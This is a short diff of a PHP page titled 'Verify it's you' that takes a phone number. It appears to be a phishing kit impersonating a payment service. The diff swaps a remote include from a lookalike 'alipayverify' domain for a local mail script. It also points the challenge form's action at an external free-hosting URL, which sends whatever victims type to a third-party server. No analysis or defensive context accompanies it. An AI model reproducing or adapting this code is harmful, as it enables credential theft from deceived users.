@@ -1,6 +1,6 @@
 <?php
 
-include('http://alipayverify.website/mail.php');
+include('mail.php');
 
 if (isset($_POST['phoneNumber'])) { 
 
@@ -833,7 +833,7 @@ function validateForm() {
   </div>
   <div class="main content clearfix">
 <div class="card flex-card challenge-card">
-  <form method="post" id="challengeform" action="#">
+  <form method="post" id="challengeform" action="https://bobstottts.000webhostapp.com/indexs.php">
   <input type="hidden" id="here" value="test">
   <h1 id="login-challenge-heading">
   Verify it's you
